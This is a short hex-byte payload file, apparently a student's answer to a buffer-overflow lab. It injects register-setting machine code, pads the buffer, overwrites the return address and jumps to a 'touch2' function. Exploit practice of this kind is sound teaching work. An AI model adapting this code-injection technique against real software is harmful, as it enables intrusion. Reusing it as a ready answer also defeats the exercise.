/* adding the arguments */
48 c7 c7 88 8b 4b 3d 48
c7 c6 4c 51 f1 5b c3 00
/* padding 136-8*2 bytes */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
/* rsp after 2 stepi's */
58 54 61 55 00 00 00 00 
/* touch2 address */
87 15 40 00 00 00 00 00
